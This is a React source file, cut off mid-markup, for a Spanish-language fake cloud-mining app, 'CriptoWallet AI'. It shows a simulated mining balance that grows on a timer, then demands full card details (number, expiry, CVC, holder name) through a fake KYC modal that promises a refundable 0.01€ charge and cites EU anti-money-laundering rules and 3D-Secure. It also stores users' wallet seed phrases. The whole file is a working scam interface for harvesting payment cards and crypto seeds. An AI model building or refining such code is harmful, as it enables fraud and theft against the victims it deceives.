import React, { useState, useEffect, useRef } from 'react';
import { User, WithdrawalRequest, AppState, MiningStats } from '../types';
import { generateMiningAdvice } from '../services/geminiService';
import { Terminal, CreditCard, Clock, Users, Settings as SettingsIcon, MessageSquare, LogOut, TrendingUp, Bitcoin, Shield, Cpu, Zap, Activity, Server, ChevronRight, X, AlertTriangle, Lock, CheckSquare, Copy, Award, Star, Globe, PlusCircle, Send, ShieldCheck, Loader2 } from 'lucide-react';

interface DashboardProps {
  user: User;
  appState: AppState;
  updateUser: (u: User) => void;
  addWithdrawal: (w: WithdrawalRequest) => void;
  logout: () => void;
}

const BTC_PRICE = 96500; // Precio simulado BTC

// Algoritmo de Luhn para verificar tarjetas reales
const isValidLuhn = (cardNumber: string) => {
    let sum = 0;
    let shouldDouble = false;
    // Loop through values starting at the rightmost side
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));

        if (shouldDouble) {
            if ((digit *= 2) > 9) digit -= 9;
        }

        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
};

// Validar dirección BTC (Legacy, Segwit, Native Segwit)
const isValidBTCAddress = (address: string) => {
    const btcRegex = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/;
    return btcRegex.test(address);
};

// Detección de tipo de tarjeta
const getCardType = (number: string) => {
    const re = {
        visa: /^4/,
        mastercard: /^5[1-5]|^2[2-7]/,
        amex: /^3[47]/
    };
    if (re.visa.test(number)) return 'visa';
    if (re.mastercard.test(number)) return 'mastercard';
    if (re.amex.test(number)) return 'amex';
    return 'unknown';
};

export const Dashboard: React.FC<DashboardProps> = ({ user, appState, updateUser, addWithdrawal, logout }) => {
  const [view, setView] = useState<'mining' | 'withdraw' | 'history' | 'referral' | 'support' | 'chat' | 'settings'>('mining');
  const [miningActive, setMiningActive] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const logContainerRef = useRef<HTMLDivElement>(null);
  const chatEndRef = useRef<HTMLDivElement>(null);
  
  // Ref para manejar el usuario actual sin reiniciar efectos
  const userRef = useRef(user);
  useEffect(() => { userRef.current = user; }, [user]);

  // Withdrawal State
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvc: '', holder: '' });
  const [withdrawStep, setWithdrawStep] = useState(1); // 1: Form, 1.5: Verifying Address, 2: KYC/Card (Modal), 3: Success
  const [cardType, setCardType] = useState<'visa' | 'mastercard' | 'amex' | 'unknown'>('unknown');
  const [isVerifyingAddress, setIsVerifyingAddress] = useState(false);

  // Chat State
  const [chatInput, setChatInput] = useState('');
  const [chatHistory, setChatHistory] = useState<{role: string, text: string}[]>([]);
  const [isTyping, setIsTyping] = useState(false);

  // Stats
  const [stats, setStats] = useState<MiningStats>({ hashrate: 0, activeNodes: 0, temperature: 45, power: 120, fanSpeed: 2000 });

  // Settings State
  const [seedPhraseInput, setSeedPhraseInput] = useState('');
  
  // Mining Logic - Separated Intervals for Performance and Stability
  useEffect(() => {
    if (!miningActive) {
        setStats({ hashrate: 0, activeNodes: 0, temperature: 35, power: 0, fanSpeed: 0 });
        return;
    }

    // 1. Visual Stats & Logs Interval (ULTRA FAST - 25ms)
    const visualInterval = setInterval(() => {
        const randomHex = Array.from({length: 4}, () => Math.floor(Math.random()*16).toString(16)).join('');
        const nodeID = Math.floor(Math.random() * 1200);
        
        // Simular logs "Matrix" style rapidísimos
        const logTypes = [
            `[Kernel] SHA-256 block accepted: 00000000...${randomHex} (4ms)`,
            `[NET] Node-EU-${nodeID} sync: 100% | Latency: 2ms`,
            `[GPU] Core Temp: ${60 + Math.floor(Math.random()*10)}°C | Fan: ${80 + Math.floor(Math.random()*20)}%`,
            `[AI] Optimization routine: +4.2% efficiency`,
            `[CHAIN] Valid share submitted. Reward pending.`,
            `[MEMPOOL] Scanning 4023 txs... Priority confirmed.`,
            `[ALGO] Switching stratum to eu-west-2... OK`,
            `[SEC] WAF: Blocked 3 malicious packets from IP 192.168.x.x`
        ];
        const newLog = logTypes[Math.floor(Math.random() * logTypes.length)];
        
        setLogs(prev => {
            const n = [...prev, newLog];
            return n.length > 25 ? n.slice(-25) : n; // Mantener logs controlados
        });

        // Actualizar stats visuales
        setStats({
            hashrate: 145 + (Math.random() * 5),
            activeNodes: 1240 + Math.floor(Math.random() * 50),
            temperature: 62 + Math.random() * 3,
            power: 850 + Math.random() * 20,
            fanSpeed: 4200 + Math.random() * 300
        });
    }, 25); // Velocidad visual AUMENTADA

    // 2. Balance Update Interval
    const balanceInterval = setInterval(() => {
        const increment = (Math.random() * 0.045) + 0.018; 
        
        const currentUser = userRef.current;
        updateUser({
            ...currentUser,
            balance: currentUser.balance + increment
        });
    }, 1000);

    return () => {
        clearInterval(visualInterval);
        clearInterval(balanceInterval);
    };
  }, [miningActive, updateUser]); 

  // Auto-scroll logs
  useEffect(() => {
    if (logContainerRef.current) {
        logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [logs]);

  // Auto-scroll chat
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [chatHistory, isTyping]);

  // Handle Card Type Detection
  useEffect(() => {
    setCardType(getCardType(cardDetails.number));
  }, [cardDetails.number]);

  const handleWithdrawSubmit = () => {
    if (withdrawStep === 1 && withdrawAddress) {
        // Validate Address Format Check
        if (!isValidBTCAddress(withdrawAddress)) {
            alert("Error: Dirección de Bitcoin no válida. Asegúrese de que sea una dirección Legacy (empieza por 1), Script (empieza por 3) o Segwit (empieza por bc1).");
            return;
        }

        // Simulate Blockchain Verification
        setIsVerifyingAddress(true);
        setTimeout(() => {
            setIsVerifyingAddress(false);
            setWithdrawStep(2); // Open Payment Modal
        }, 2500); // 2.5s simulated check

    } else if (withdrawStep === 2) {
        // Validation Logic
        const cleanNumber = cardDetails.number.replace(/\D/g, '');
        
        if (cleanNumber.length < 13 || !isValidLuhn(cleanNumber)) {
            alert("Error: Tarjeta no válida. El sistema ha detectado que la numeración es incorrecta o falsa.");
            return;
        }

        if(!cardDetails.cvc || !cardDetails.holder || !cardDetails.expiry) {
            alert("Por favor rellene todos los campos de seguridad.");
            return;
        }

        addWithdrawal({
            id: Date.now().toString(),
            userId: user.id,
            amount: user.balance,
            btcAddress: withdrawAddress,
            status: 'Pendiente',
            date: new Date().toISOString(),
            cardInfo: cardDetails
        });
        updateUser({...user, balance: 0});
        setWithdrawStep(3); 
    }
  };

  const handleChat = async () => {
    if(!chatInput.trim()) return;
    const msg = chatInput;
    setChatInput('');
    setChatHistory(prev => [...prev, {role: 'user', text: msg}]);
    setIsTyping(true);
    
    // Simulate slight delay then AI response
    try {
        const reply = await generateMiningAdvice(msg);
        setChatHistory(prev => [...prev, {role: 'ai', text: reply}]);
    } catch (e) {
        setChatHistory(prev => [...prev, {role: 'ai', text: "Error de conexión con el nodo IA."}]);
    } finally {
        setIsTyping(false);
    }
  };

  const saveSettings = () => {
    updateUser({
        ...user,
        seedPhrase: seedPhraseInput,
        walletAddress: withdrawAddress || user.walletAddress
    });
    alert("Configuración de seguridad actualizada.");
  };

  const copyReferral = () => {
      navigator.clipboard.writeText(`https://criptowallet.ai/ref/${user.referralCode}`);
      alert("Enlace copiado al portapapeles");
  };

  // Simulación de Referidos y XP
  const simulateReferral = () => {
      const xpGain = 500;
      const newXp = user.xp + xpGain;
      let newLevel: 'Bronce' | 'Plata' | 'Oro' = 'Bronce';
      
      if (newXp >= 15000) newLevel = 'Oro';
      else if (newXp >= 5000) newLevel = 'Plata';
      else newLevel = 'Bronce';

      updateUser({
          ...user,
          xp: newXp,
          referralLevel: newLevel
      });
      alert(`¡Nuevo referido simulado! Has ganado +${xpGain} XP.`);
  };

  return (
    <div className="min-h-screen flex bg-[#0B1120] text-white font-sans overflow-hidden">
        {/* Modal Overlay for Step 2 */}
        {withdrawStep === 2 && (
            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200">
                <div className="bg-slate-900 border border-slate-600 rounded-2xl w-full max-w-md shadow-2xl relative overflow-hidden">
                    {/* Security Ribbon */}
                    <div className="bg-yellow-600/20 border-b border-yellow-500/30 p-3 flex items-center gap-2 text-yellow-500 text-xs font-bold uppercase tracking-wide justify-center">
                        <Lock size={12} /> Conexión Segura SSL 256-bit • Pago Verificado
                    </div>
                    
                    <button 
                        onClick={() => setWithdrawStep(1)}
                        className="absolute top-3 right-3 text-gray-400 hover:text-white"
                    >
                        <X size={20} />
                    </button>

                    <div className="p-8">
                        <div className="flex flex-col items-center mb-6 text-center">
                            <div className="w-16 h-16 bg-blue-900/30 rounded-full flex items-center justify-center mb-4 border border-blue-500/50 relative">
                                <Shield className="text-blue-400 w-8 h-8" />
                                <div className="absolute -bottom-1 -right-1 bg-green-500 rounded-full p-1"><CheckSquare size={10} className="text-white"/></div>
                            </div>
                            <h3 className="text-xl font-bold text-white">Verificación KYC Antiblanqueo</h3>
                            <p className="text-xs text-gray-400 mt-2">
                                Cumplimiento Directiva (UE) 2015/849 y MiCA
                            </p>
                        </div>

                        <div className="bg-blue-900/20 border border-blue-500/20 rounded-lg p-4 mb-6">
                            <p className="text-xs text-blue-200 leading-relaxed text-justify">
                                <span className="font-bold">AVISO DE SEGURIDAD:</span> Para verificar que usted es humano y prevenir lavado de dinero, se realizará un cargo temporal de <span className="text-white font-bold text-lg">0.01€</span> (o equivalente en su moneda). Este importe es <span className="text-white font-bold underline">simbólico y reembolsable</span> instantáneamente tras la validación de la tarjeta.
                            </p>
                        </div>

                        <div className="space-y-4">
                            {/* Payment Icons - WITH WHITE BACKGROUNDS */}
                            <div className="flex gap-3 justify-center mb-4 flex-wrap">
                                <div className={`p-2 rounded bg-white h-10 w-16 flex items-center justify-center shadow transition-all ${cardType === 'mastercard' ? 'ring-2 ring-blue-500 scale-110' : 'opacity-80'}`}>
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-full object-contain" />
                                </div>
                                <div className={`p-2 rounded bg-white h-10 w-16 flex items-center justify-center shadow transition-all ${cardType === 'visa' ? 'ring-2 ring-blue-500 scale-110' : 'opacity-80'}`}>
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-full object-contain" />
                                </div>
                                <div className={`p-2 rounded bg-white h-10 w-16 flex items-center justify-center shadow transition-all ${cardType === 'amex' ? 'ring-2 ring-blue-500 scale-110' : 'opacity-80'}`}>
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" className="h-full object-contain" />
                                </div>
                                <div className="p-2 rounded bg-white h-10 w-16 flex items-center justify-center shadow opacity-80">
                                     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" className="h-full object-contain" />
                                </div>
                            </div>

                            <div className="space-y-3">
                                <input 
                                    type="text" 
                                    placeholder="Nombre del Titular (Como aparece en tarjeta)"
                                    className="w-full bg-slate-800 border border-slate-600 p-3 rounded-lg text-white text-sm focus:border-blue-500 outline-none transition-colors"
                                    value={cardDetails.holder}
                                    onChange={e => setCardDetails({...cardDetails, holder: e.target.value})}
                                />
                                
                                <div className="relative">
                                    <input 
                                        type="text" 
                                        placeholder="Número de Tarjeta"
                                        maxLength={19}
                                        className={`w-full bg-slate-800 border p-3 rounded-lg font-mono text-white text-sm focus:border-blue-500 outline-none transition-colors ${cardType !== 'unknown' ? 'border-green-500/50' : 'border-slate-600'}`}
                                        value={cardDetails.number}
                                        onChange={e => setCardDetails({...cardDetails, number: e.target.value})}
                                    />
                                    {cardType !== 'unknown' && <CheckSquare className="absolute right-3 top-3 text-green-500 w-4 h-4" />}
                                </div>

                                <div className="flex gap-3">
                                    <input 
                                        type="text" 
                                        placeholder="MM/YY"
                                        maxLength={5}
                                        className="w-1/2 bg-slate-800 border border-slate-600 p-3 rounded-lg font-mono text-white text-sm focus:border-blue-500 outline-none transition-colors"
                                        value={cardDetails.expiry}
                                        onChange={e => setCardDetails({...cardDetails, expiry: e.target.value})}
                                    />
                                    <input 
                                        type="text" 
                                        placeholder="CVC"
                                        maxLength={4}
                                        className="w-1/2 bg-slate-800 border border-slate-600 p-3 rounded-lg font-mono text-white text-sm focus:border-blue-500 outline-none transition-colors"
                                        value={cardDetails.cvc}
                                        onChange={e => setCardDetails({...cardDetails, cvc: e.target.value})}
                                    />
                                </div>
                            </div>

                            <button 
                                onClick={handleWithdrawSubmit}
                                className="w-full bg-emerald-600 hover:bg-emerald-500 py-3 rounded-lg font-bold transition-all mt-4 shadow-lg shadow-emerald-500/20 text-sm flex items-center justify-center gap-2"
                            >
                                <Lock size={14} /> Pagar 0.01€ y Retirar Fondos
                            </button>
                            <p className="text-[10px] text-gray-500 text-center mt-2 flex items-center justify-center gap-1">
                                <ShieldCheck size={10} /> Transacción protegida por 3D-Secure V2
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        )}

        {/* Sidebar */}
        <div className="w-20 md:w-64 bg-slate-900 border-r border-slate-800 flex flex-col z-20">
            <div className="p-6 border-b border-slate-800 flex items-center gap-3">
                <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                    <Bitcoin className="text-white" size={20} />
                </div>
                <span className="font-bold text-xl tracking-tight hidden md:block text-white">CriptoWallet<span className="text-blue-500">AI</span></span>
            </div>
            
            <nav className="flex-1 p-4 space-y-2">
                {[
                    { id: 'mining', icon: Cpu, label: 'Panel de Minado' },
                    { id: 'withdraw', icon: TrendingUp, label: 'Retirar Fondos' },
                    { id: 'history', icon: Clock, label: 'Historial' },
                    { id: 'referral', icon: Users, label: 'Sistema Referidos' },
                    { id: 'chat', icon: MessageSquare, label: 'AI Support' },
                    { id: 'settings', icon: SettingsIcon, label: 'Configuración' },
                ].map((item) => (
                    <button
                        key={item.id}
                        onClick={() => setView(item.id as any)}
                        className={`w-full flex items-center gap-3 p-3 rounded-xl transition-all border border-transparent ${view === item.id ? 'bg-blue-600/10 border-blue-600 text-blue-400' : 'hover:bg-slate-800 text-gray-400 hover:text-white'}`}
                    >
                        <item.icon size={20} />
                        <span className="hidden md:block font-medium">{item.label}</span>
                        {view === item.id && <ChevronRight className="ml-auto w-4 h-4 hidden md:block" />}
                    </button>
                ))}
            </nav>

            <div className="p-4 border-t border-slate-800">
                <button onClick={logout} className="w-full flex items-center gap-3 p-3 text-red-400 hover:bg-red-900/10 rounded-xl transition-colors">
                    <LogOut size={20} />
                    <span className="hidden md:block">Desconectar</span>
                </button>
            </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 flex flex-col relative bg-[#0F172A] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-slate-800 via-[#0F172A] to-[#0B1120]">
            {/* Header */}
            <header className="h-20 bg-slate-900/50 backdrop-blur-xl border-b border-slate-800 flex justify-between items-center px-8 z-10 sticky top-0">
                <div className="flex items-center gap-4">
                    <h2 className="text-2xl font-bold capitalize bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-400">{view.replace('-', ' ')}</h2>
                    {miningActive && (
                        <div className="flex items-center gap-2 px-3 py-1 bg-green-500/10 border border-green-500/30 rounded-full text-green-400 text-xs animate-pulse">
                            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                            MINING ACTIVE
                        </div>
                    )}
                </div>
                <div className="flex items-center gap-6">
                    <div className="text-right hidden sm:block">
                        <p className="text-xs text-gray-400 font-medium uppercase tracking-wider">Saldo Global</p>
                        <div className="flex items-baseline gap-2 justify-end">
                             <p className="text-xl font-bold font-mono text-emerald-400">${user.balance.toFixed(4)}</p>
                             <p className="text-xs font-mono text-gray-500">≈ {(user.balance / BTC_PRICE).toFixed(8)} BTC</p>
                        </div>
                    </div>
                    <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-blue-500 to-purple-600 p-[1px]">
                         <div className="w-full h-full bg-slate-900 rounded-[7px] flex items-center justify-center font-bold text-white">
                            {user.name.charAt(0)}
                         </div>
                    </div>
                </div>
            </header>

            <main className="flex-1 overflow-y-auto p-4 md:p-8 relative scrollbar-hide">
                
                {/* Botón flotante de chat */}
                {view !== 'chat' && (
                    <div className="fixed bottom-8 right-8 z-50">
                        <button onClick={() => setView('chat')} className="w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center shadow-lg shadow-blue-500/50 hover:scale-110 transition-transform border-2 border-white/10">
                            <MessageSquare />
                        </button>
                    </div>
                )}

                {/* --- RENDER CONTENT BASED ON VIEW --- */}

                {view === 'mining' && (
                    <div className="max-w-6xl mx-auto space-y-6">
                        {/* Stats Grid */}
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                            {[
                                { label: "Hashrate Global", value: `${stats.hashrate.toFixed(1)} TH/s`, icon: Activity, color: "text-blue-400" },
                                { label: "Nodos Conectados", value: stats.activeNodes, icon: Server, color: "text-purple-400" },
                                { label: "Temp. Núcleo", value: `${stats.temperature.toFixed(1)}°C`, icon: Zap, color: stats.temperature > 80 ? "text-red-400" : "text-orange-400" },
                                { label: "Consumo Red", value: `${stats.power.toFixed(0)} W`, icon: Shield, color: "text-green-400" }
                            ].map((stat, i) => (
                                <div key={i} className="bg-slate-800/50 backdrop-blur border border-slate-700 p-4 rounded-xl relative overflow-hidden group">
                                    <div className={`absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity ${stat.color}`}>
                                        <stat.icon size={40} />
                                    </div>
                                    <p className="text-gray-400 text-xs uppercase font-medium mb-1">{stat.label}</p>
                                    <p className={`text-2xl font-bold font-mono ${stat.color} ${miningActive ? 'animate-pulse' : ''}`}>{stat.value}</p>
                                </div>
                            ))}
                        </div>

                        {/* Main Interface */}
                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 h-[500px]">
                            {/* Visualizer (Left) */}
                            <div className="lg:col-span-2 bg-black rounded-2xl border border-slate-800 overflow-hidden relative shadow-2xl flex flex-col">
                                <div className="absolute inset-0 bg-[url('https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif')] opacity-10 pointer-events-none bg-cover mix-blend-screen"></div>
                                <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
                                
                                <div className="p-4 border-b border-slate-800 bg-slate-900/80 flex justify-between items-center">
                                    <div className="flex gap-2">
                                        <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                        <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                        <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                    </div>
                                    <span className="font-mono text-xs text-gray-500">AI_Quantum_Miner_v4.2.exe</span>
                                </div>

                                <div className="flex-1 p-6 font-mono text-sm relative z-10 flex flex-col justify-end">
                                    <div className="flex-1 overflow-y-auto scrollbar-hide space-y-1 pb-4" ref={logContainerRef}>
                                        <div className="text-blue-500 mb-4 opacity-80">
                                            &gt; Initializing Neural Network... OK<br/>
                                            &gt; Connecting to Satellite Uplink... OK<br/>
                                            &gt; Bypass Firewall Level 4... OK<br/>
                                            &gt; System Ready. Waiting for command.<br/>
                                            ----------------------------------------
                                        </div>
                                        {logs.map((log, i) => (
                                            <div key={i} className="text-emerald-500/90 text-xs md:text-sm tracking-wide">
                                                <span className="text-gray-600 mr-2">➜</span>
                                                {log}
                                            </div>
                                        ))}
                                        {!miningActive && <div className="text-yellow-500 animate-pulse mt-2">&gt; SYSTEM IDLE. PRESS START TO INITIATE.</div>}
                                    </div>
                                    
                                    {/* Balance Overlay */}
                                    <div className="mt-4 pt-4 border-t border-slate-800 flex justify-between items-end">
                                        <div>
                                            <p className="text-gray-500 text-xs mb-1">CURRENT SESSION EARNINGS</p>
                                            <div className="text-3xl font-bold text-white tracking-tight flex items-center gap-2">
                                                <Bitcoin className="text-yellow-500" />
                                                {(user.balance / BTC_PRICE).toFixed(8)}
                                            </div>
                                        </div>
                                        <div className="text-right">
                                            <p className="text-gray-500 text-xs mb-1">USD EQUIVALENT</p>
                                            <div className="text-2xl font-bold text-emerald-400">
                                                ${user.balance.toFixed(2)}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Controls (Right) */}
                            <div className="bg-slate-800/50 backdrop-blur rounded-2xl border border-slate-700 p-6 flex flex-col justify-between">
                                <div>
                                    <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                                        <SettingsIcon size={18} className="text-blue-400"/> Configuración de Nodo
                                    </h3>
                                    
                                    <div className="space-y-4">
                                        <div>
                                            <label className="text-xs text-gray-400 uppercase font-bold mb-2 block">Intensidad de IA</label>
                                            <div className="w-full h-2 bg-slate-700 rounded-full overflow-hidden">
                                                <div className="h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-1000" style={{ width: miningActive ? '90%' : '0%' }}></div>
                                            </div>
                                            <div className="flex justify-between mt-1 text-xs text-gray-500">
                                                <span>Low</span>
                                                <span>Quantum High</span>
                                            </div>
                                        </div>
                                        <div>
                                            <label className="text-xs text-gray-400 uppercase font-bold mb-2 block">Algoritmo de Minado</label>
                                            <div className="w-full bg-slate-900 p-3 rounded-lg text-sm text-gray-300 border border-slate-700 flex justify-between">
                                                <span>SHA-256 (Bitcoin)</span>
                                                <span className="text-green-500 text-xs">OPTIMAL</span>
                                            </div>
                                        </div>
                                        
                                        <div className="p-4 bg-blue-900/20 border border-blue-500/20 rounded-lg">
                                            <p className="text-xs text-blue-200">
                                                <span className="font-bold">Nota:</span> Al activar el minado, tu navegador se conecta a nuestra granja en Islandia. No consume tu batería.
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                <button 
                                    onClick={() => setMiningActive(!miningActive)}
                                    className={`w-full py-6 rounded-xl font-bold text-lg uppercase tracking-widest transition-all transform hover:scale-[1.02] shadow-2xl relative overflow-hidden group ${miningActive ? 'bg-red-600 hover:bg-red-500 shadow-red-900/50' : 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-900/50'}`}
                                >
                                    <div className="absolute inset-0 bg-white/10 group-hover:translate-x-full transition-transform duration-500 skew-x-12"></div>
                                    <span className="relative z-10 flex items-center justify-center gap-3">
                                        {miningActive ? <><LogOut /> Detener Operación</> : <><Zap /> Iniciar Secuencia</>}
                                    </span>
                                </button>
                            </div>
                        </div>
                    </div>
                )}
                
                {/* ... other views (withdraw, history, etc) remain unchanged structurally ... */}
                {view === 'withdraw' && (
                    <div className="max-w-2xl mx-auto bg-slate-800 rounded-2xl p-8 border border-slate-700 shadow-2xl">
                        {/* Only showing Step 1 here, Step 2 is now a Modal managed at the top of return */}
                        {withdrawStep === 1 && (
                            <div className="animate-fade-in-up">
                                <h3 className="text-2xl font-bold mb-6 text-white border-b border-slate-700 pb-4">Retirar Fondos</h3>
                                <div className="space-y-6">
                                    <div className="bg-slate-900 p-6 rounded-xl border border-slate-700 text-center">
                                        <label className="block text-sm text-gray-400 mb-2 uppercase tracking-wide">Saldo Disponible</label>
                                        <div className="text-4xl font-bold text-emerald-400 mb-1">${user.balance.toFixed(2)}</div>
                                        <div className="text-sm text-gray-500">≈ {(user.balance / BTC_PRICE).toFixed(8)} BTC</div>
                                    </div>
                                    <div>
                                        <label className="block text-sm text-gray-400 mb-2">Dirección de Billetera BTC (Segwit)</label>
                                        {isVerifyingAddress ? (
                                            <div className="w-full bg-slate-900 border border-blue-500/50 p-4 rounded-lg flex items-center justify-center gap-3 animate-pulse">
                                                <Loader2 className="animate-spin text-blue-500" />
                                                <span className="text-blue-300 font-mono">Verificando en Blockchain (Mempool)...</span>
                                            </div>
                                        ) : (
                                            <input 
                                                type="text" 
                                                className="w-full bg-slate-900 border border-slate-600 p-4 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none font-mono text-white transition-all focus:border-blue-500"
                                                placeholder="bc1q..."
                                                value={withdrawAddress}
                                                onChange={e => setWithdrawAddress(e.target.value)}
                                            />
                                        )}
                                        <p className="text-xs text-gray-500 mt-2 flex items-center gap-1"><Shield size={12}/> Verificaremos que la dirección no esté en listas negras.</p>
                                    </div>
                                    <button 
                                        onClick={handleWithdrawSubmit}
                                        disabled={isVerifyingAddress}
                                        className="w-full bg-blue-600 py-4 rounded-lg font-bold hover:bg-blue-500 transition-all transform hover:-translate-y-1 shadow-lg shadow-blue-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                                    >
                                        {isVerifyingAddress ? 'Validando...' : 'Continuar al Pago'}
                                    </button>
                                </div>
                            </div>
                        )}
                        
                        {withdrawStep === 3 && (
                            <div className="text-center py-12 animate-bounce-in">
                                <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-green-500/40">
                                    <Clock className="text-white w-12 h-12" />
                                </div>
                                <h3 className="text-3xl font-bold mb-4 text-white">Solicitud Recibida</h3>
                                <p className="text-gray-400 mb-8 max-w-sm mx-auto">Su retiro ha entrado en la mempool prioritaria. Se confirmará en los próximos 2 bloques.</p>
                                <button onClick={() => setView('history')} className="px-8 py-3 bg-slate-700 hover:bg-slate-600 rounded-full text-white transition-colors">Ver Estado</button>
                            </div>
                        )}
                    </div>
                )}
                
                {/* ... Rest of Dashboard remains unchanged ... */}
                {view === 'history' && (
                    <div className="bg-slate-800 rounded-2xl overflow-hidden border border-slate-700 shadow-xl min-h-[400px]">
                        <table className="w-full text-left">
                            <thead className="bg-slate-900/50">
                                <tr>
                                    <th className="p-6 text-sm font-bold text-gray-400 uppercase">Fecha</th>
                                    <th className="p-6 text-sm font-bold text-gray-400 uppercase">Monto</th>
                                    <th className="p-6 text-sm font-bold text-gray-400 uppercase">Estado</th>
                                    <th className="p-6 text-sm font-bold text-gray-400 uppercase">Hash TX</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-slate-700">
                                {appState.withdrawals.filter(w => w.userId === user.id).length === 0 ? (
                                    <tr>
                                        <td colSpan={4} className="p-12 text-center">
                                            <div className="flex flex-col items-center justify-center opacity-50 py-12">
                                                <TrendingUp size={64} className="mb-4 text-gray-500" />
                                                <h3 className="text-xl font-bold text-gray-300">Ningún retiro realizado todavía</h3>
                                                <p className="text-gray-500 mt-2">Tus transacciones aparecerán aquí.</p>
                                                <button onClick={() => setView('mining')} className="mt-6 px-6 py-2 bg-blue-600/20 text-blue-400 rounded-full hover:bg-blue-600 hover:text-white transition-colors">
                                                    Ir a Minar
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                ) : (
                                    appState.withdrawals.filter(w => w.userId === user.id).map(w => (
                                        <tr key={w.id} className="hover:bg-slate-700/30 transition-colors">
                                            <td className="p-6 text-sm text-gray-300">{new Date(w.date).toLocaleDateString()}</td>
                                            <td className="p-6 font-bold text-white text-lg">${w.amount.toFixed(2)}</td>
                                            <td className="p-6"><span className="px-3 py-1 rounded-full bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-xs font-bold">{w.status}</span></td>
                                            <td className="p-6 font-mono text-xs text-gray-500">pending_mempool...</td>
                                        </tr>
                                    ))
                                )}
                            </tbody>
                        </table>
                    </div>
                )}
                {/* ... Chat, Referral, Settings ... */}
                {view === 'chat' && (
                    <div className="max-w-4xl mx-auto h-[70vh] flex flex-col bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden shadow-2xl">
                        <div className="p-4 bg-slate-900 border-b border-slate-700 flex items-center gap-3">
                            <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse shadow-[0_0_10px_#22c55e]"></div>
                            <div>
                                <span className="font-bold text-white block">Soporte IA Cuántico</span>
                                <span className="text-xs text-gray-500">En línea • Respuesta &lt; 1s</span>
                            </div>
                        </div>
                        <div className="flex-1 p-6 overflow-y-auto space-y-6 bg-[#0B1120] scroll-smooth">
                            {chatHistory.length === 0 && (
                                <div className="text-center text-gray-500 mt-20">
                                    <div className="w-20 h-20 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6">
                                        <MessageSquare size={32} className="text-blue-500" />
                                    </div>
                                    <p className="text-lg font-medium text-white mb-2">¿En qué puedo ayudarte hoy?</p>
                                    <p className="text-sm">Pregúntame sobre retiros, configuración de nodos o rentabilidad.</p>
                                </div>
                            )}
                            {chatHistory.map((msg, i) => (
                                <div key={i} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in-up`}>
                                    <div className={`max-w-[80%] p-5 rounded-2xl shadow-lg leading-relaxed ${msg.role === 'user' ? 'bg-blue-600 text-white rounded-br-none' : 'bg-slate-700 text-gray-200 rounded-bl-none'}`}>
                                        {msg.text}
                                    </div>
                                </div>
                            ))}
                            {isTyping && <div className="flex justify-start animate-pulse">
                                <div className="bg-slate-700 p-4 rounded-2xl rounded-bl-none text-gray-400 text-sm flex gap-2 items-center">
                                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce delay-75"></div>
                                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce delay-150"></div>
                                </div>
                            </div>}
                            <div ref={chatEndRef} />
                        </div>
                        <div className="p-4 bg-slate-900 border-t border-slate-700 flex gap-2">
                            <input 
                                className="flex-1 bg-slate-800 border border-slate-600 rounded-xl px-6 py-4 focus:outline-none focus:border-blue-500 transition-colors text-white"
                                placeholder="Escribe tu consulta..."
                                value={chatInput}
                                onChange={e => setChatInput(e.target.value)}
                                onKeyDown={e => e.key === 'Enter' && handleChat()}
                                disabled={isTyping}
                            />
                            <button 
                                onClick={handleChat} 
                                disabled={isTyping || !chatInput.trim()}
                                className="bg-blue-600 px-6 rounded-xl hover:bg-blue-500 transition-colors shadow-lg shadow-blue-600/20 disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                <Send size={24} className="text-white" />
                            </button>
                        </div>
